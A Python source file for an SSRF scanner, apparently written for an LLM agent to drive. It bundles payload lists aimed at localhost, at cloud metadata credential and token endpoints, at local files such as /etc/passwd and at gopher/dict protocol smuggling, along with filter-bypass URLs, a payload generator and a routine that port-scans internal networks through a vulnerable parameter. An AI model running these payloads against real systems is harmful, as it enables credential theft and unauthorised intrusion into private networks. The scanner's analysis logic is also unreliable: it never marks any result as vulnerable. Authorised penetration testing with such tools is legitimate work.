"""
SSRF Scanner - Server-Side Request Forgery Detection
Easy for LLM to test SSRF vulnerabilities
"""

import re
import socket
import time
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, quote

import sys
sys.path.append('..')
from core.http_client import HTTPClient, Response


@dataclass
class SSRFResult:
    """SSRF test result"""
    vulnerable: bool
    payload: str
    ssrf_type: str  # full, partial, blind
    evidence: str
    internal_resource: str
    confidence: str
    
    def to_dict(self) -> Dict:
        return {
            "vulnerable": self.vulnerable,
            "payload": self.payload,
            "ssrf_type": self.ssrf_type,
            "evidence": self.evidence,
            "internal_resource": self.internal_resource,
            "confidence": self.confidence
        }


class SSRFScanner:
    """
    SSRF vulnerability scanner
    
    Usage for LLM:
    - scanner.test_parameter(url, param) - Test parameter for SSRF
    - scanner.test_url_fetch(url, param) - Test URL fetching functionality
    - scanner.get_payloads() - Get SSRF payloads
    - scanner.generate_payload(target) - Generate payload for specific target
    """
    
    def __init__(self, client: Optional[HTTPClient] = None,
                 callback_server: Optional[str] = None):
        self.client = client or HTTPClient()
        self.callback_server = callback_server  # For blind SSRF detection
        
        # Internal/localhost payloads
        self.localhost_payloads = [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://127.0.0.1:80/",
            "http://127.0.0.1:443/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:8080/",
            "http://0.0.0.0/",
            "http://0/",
            "http://[::1]/",
            "http://[0:0:0:0:0:0:0:1]/",
            "http://127.1/",
            "http://127.0.1/",
        ]
        
        # Cloud metadata endpoints
        self.cloud_metadata = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/meta-data/hostname",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token",
            ],
            "digitalocean": [
                "http://169.254.169.254/metadata/v1/",
                "http://169.254.169.254/metadata/v1.json",
            ]
        }
        
        # Internal network scan payloads
        self.internal_network = [
            "http://192.168.0.1/",
            "http://192.168.1.1/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://intranet/",
            "http://internal/",
            "http://localhost:8080/",
            "http://localhost:3000/",
            "http://localhost:5000/",
        ]
        
        # Protocol smuggling
        self.protocol_payloads = [
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://localhost:11211/stats",
            "gopher://localhost:25/",
            "sftp://localhost/",
            "tftp://localhost/",
            "ldap://localhost/",
        ]
        
        # Bypass techniques
        self.bypass_payloads = [
            # Decimal IP
            "http://2130706433/",  # 127.0.0.1
            "http://0x7f000001/",  # Hex
            # URL encoding
            "http://127.0.0.1%00@evil.com/",
            "http://evil.com%40127.0.0.1/",
            # DNS rebinding
            "http://localtest.me/",  # Resolves to 127.0.0.1
            "http://127.0.0.1.nip.io/",
            # Redirects
            "http://httpbin.org/redirect-to?url=http://127.0.0.1/",
            # Unicode
            "http://①②⑦.0.0.①/",
            # Short URL services
            "http://bit.ly/xxx",  # Example
            # Enclosed alphanumerics
            "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/",
        ]
        
        # Indicators of successful SSRF
        self.ssrf_indicators = {
            "aws_meta": [
                "ami-id", "instance-id", "security-credentials",
                "iam/", "user-data", "meta-data"
            ],
            "internal": [
                "root:x:", "/etc/passwd", "win.ini",
                "intranet", "internal", "private"
            ],
            "error": [
                "connection refused", "could not connect",
                "timeout", "name resolution", "unknown host"
            ]
        }

    def test_parameter(self, url: str, param: str, method: str = "GET",
                       categories: Optional[List[str]] = None) -> List[SSRFResult]:
        """
        Test parameter for SSRF
        
        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method
            categories: Test categories (localhost, cloud, internal, protocol, bypass)
        
        Returns:
            List of SSRF findings
        """
        categories = categories or ["localhost", "cloud"]
        results = []
        
        for category in categories:
            if category == "localhost":
                results.extend(self._test_payloads(url, param, method, self.localhost_payloads))
            elif category == "cloud":
                for cloud, payloads in self.cloud_metadata.items():
                    results.extend(self._test_payloads(url, param, method, payloads, cloud))
            elif category == "internal":
                results.extend(self._test_payloads(url, param, method, self.internal_network))
            elif category == "protocol":
                results.extend(self._test_payloads(url, param, method, self.protocol_payloads))
            elif category == "bypass":
                results.extend(self._test_payloads(url, param, method, self.bypass_payloads))
        
        return results

    def _test_payloads(self, url: str, param: str, method: str,
                       payloads: List[str], source: str = "") -> List[SSRFResult]:
        """Test a list of payloads"""
        results = []
        
        for payload in payloads:
            response = self.client.inject_payload(url, param, payload, method)
            analysis = self._analyze_response(response, payload, source)
            
            if analysis["vulnerable"]:
                results.append(SSRFResult(
                    vulnerable=True,
                    payload=payload,
                    ssrf_type=analysis["type"],
                    evidence=analysis["evidence"],
                    internal_resource=source,
                    confidence=analysis["confidence"]
                ))
        
        return results

    def _analyze_response(self, response: Response, payload: str,
                          source: str = "") -> Dict[str, Any]:
        """Analyze response for SSRF indicators"""
        body = response.body.lower()
        
        result = {
            "vulnerable": False,
            "type": "unknown",
            "evidence": "",
            "confidence": "low"
        }
        
        # Check for AWS metadata
        if "169.254.169.254" in payload or source == "aws":
            for indicator in self.ssrf_indicators["aws_meta"]:
                if indicator in body:
                    result["vulnerable"] = False
                    result["type"] = "hypothesis_full_read"
                    result["evidence"] = f"Hypothesis only: AWS metadata-like indicator '{indicator}' observed (not proof)"
                    result["confidence"] = "low"
                    return result
        
        # Check for internal file read
        for indicator in self.ssrf_indicators["internal"]:
            if indicator in body:
                result["vulnerable"] = False
                result["type"] = "hypothesis_file_read"
                result["evidence"] = f"Hypothesis only: internal marker '{indicator}' observed (not proof)"
                result["confidence"] = "low"
                return result
        
        # Check for error messages that reveal SSRF
        for indicator in self.ssrf_indicators["error"]:
            if indicator in body:
                result["vulnerable"] = False
                result["type"] = "hypothesis_partial"
                result["evidence"] = f"Hypothesis only: error string '{indicator}' may indicate attempted fetch (not proof)"
                result["confidence"] = "low"
                return result
        
        # Check response timing for blind SSRF
        if response.elapsed_ms > 5000:  # 5 second delay
            result["vulnerable"] = False
            result["type"] = "hypothesis_blind"
            result["evidence"] = f"Hypothesis only: response delayed ({response.elapsed_ms}ms); confirm via OOB collaborator"
            result["confidence"] = "low"
            return result
        
        # Check for status code changes
        if response.status_code in [500, 502, 503]:
            result["evidence"] = f"Server error (status {response.status_code}) may indicate SSRF"
            result["confidence"] = "low"
        
        return result

    def test_url_fetch(self, url: str, param: str,
                       external_url: str = "http://httpbin.org/get") -> Dict[str, Any]:
        """
        Test if application fetches external URLs
        
        Useful for identifying SSRF-vulnerable functionality
        """
        # Test with external URL
        response = self.client.inject_payload(url, param, external_url)
        
        result = {
            "fetches_urls": False,
            "reflects_content": False,
            "response_size": len(response.body),
            "evidence": ""
        }
        
        # Check if external content appears in response
        if "httpbin" in response.body.lower() or "origin" in response.body:
            result["fetches_urls"] = True
            result["reflects_content"] = True
            result["evidence"] = "External URL content reflected in response"
        
        return result

    def get_payloads(self, category: str = "all") -> Dict[str, Any]:
        """Get SSRF payloads for LLM"""
        if category == "all":
            return {
                "localhost": self.localhost_payloads,
                "cloud_metadata": self.cloud_metadata,
                "internal_network": self.internal_network,
                "protocols": self.protocol_payloads,
                "bypass": self.bypass_payloads
            }
        elif category == "localhost":
            return {"localhost": self.localhost_payloads}
        elif category == "cloud":
            return {"cloud_metadata": self.cloud_metadata}
        elif category == "bypass":
            return {"bypass": self.bypass_payloads}
        return {}

    def generate_payload(self, target: str, bypass: Optional[str] = None) -> str:
        """
        Generate SSRF payload
        
        Args:
            target: Target to reach (localhost, aws, gcp, azure, ip)
            bypass: Bypass technique (encoding, decimal, dns)
        
        Returns:
            Generated payload
        """
        if target == "localhost":
            base = "http://127.0.0.1/"
        elif target == "aws":
            base = "http://169.254.169.254/latest/meta-data/"
        elif target == "gcp":
            base = "http://metadata.google.internal/computeMetadata/v1/"
        elif target == "azure":
            base = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        else:
            base = f"http://{target}/"
        
        if bypass == "encoding":
            return quote(base, safe="")
        elif bypass == "decimal":
            # Convert 127.0.0.1 to decimal
            return "http://2130706433/"
        elif bypass == "dns":
            return "http://localtest.me/"
        
        return base

    def scan_internal_network(self, url: str, param: str,
                             network: str = "192.168.1",
                             port: int = 80,
                             start: int = 1,
                             end: int = 10) -> List[Dict[str, Any]]:
        """
        Scan internal network via SSRF
        
        Args:
            url: Target URL
            param: Vulnerable parameter
            network: Network prefix (e.g., "192.168.1")
            port: Port to scan
            start: Start IP suffix
            end: End IP suffix
        
        Returns:
            List of responding hosts
        """
        results = []
        
        for i in range(start, end + 1):
            ip = f"{network}.{i}"
            payload = f"http://{ip}:{port}/"
            
            response = self.client.inject_payload(url, param, payload)
            
            if response.status_code != 0 and len(response.body) > 0:
                # Check for different response than normal
                results.append({
                    "ip": ip,
                    "port": port,
                    "status": response.status_code,
                    "response_size": len(response.body),
                    "elapsed_ms": response.elapsed_ms
                })
        
        return results

    def get_summary(self, results: List[SSRFResult]) -> Dict[str, Any]:
        """Get summary of SSRF scan results"""
        vulnerable = [r for r in results if r.vulnerable]
        
        return {
            "total_tests": len(results),
            "vulnerable_count": len(vulnerable),
            "ssrf_types": list(set(r.ssrf_type for r in vulnerable)),
            "resources_accessed": list(set(r.internal_resource for r in vulnerable if r.internal_resource)),
            "vulnerable_payloads": [r.payload for r in vulnerable],
            "highest_confidence": max((r.confidence for r in vulnerable), default="none")
        }
